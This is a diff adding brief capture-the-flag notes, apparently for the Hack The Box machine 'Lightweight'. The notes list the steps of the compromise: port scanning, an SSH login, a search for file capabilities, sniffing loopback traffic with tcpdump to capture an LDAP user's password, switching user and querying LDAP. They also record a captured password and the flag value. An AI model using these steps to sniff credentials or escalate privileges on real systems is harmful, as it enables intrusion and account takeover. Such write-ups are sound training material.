@@ -1,0 +1,23 @@
+#10.10.10.119
+#PORT= 22, 80, 389(OpenLdap)
+
+#nmap scan
+
+#visit all pages of website    (user,status...)
+#connect through ssh using your ip as username and passwd
+ssh <IP>@10.10.10.119
+
+#check capabilites
+getcap -r /
+#tcpdump has the special capabilities
+#intercept data
+tcpdump -nXi lo(any)
+#got ldapuser2 passwd
+su ldapuser2
+#PASSWD= 8bc8251332abe1d7f105d3e53ad39ac2
+
+(ldapsearch -H ldap://10.10.10.119:389 -x -b "dc=lightweight,dc=htb") 
+
+
+#key
+8a866d3bb7e13a57aaeb110297f48026
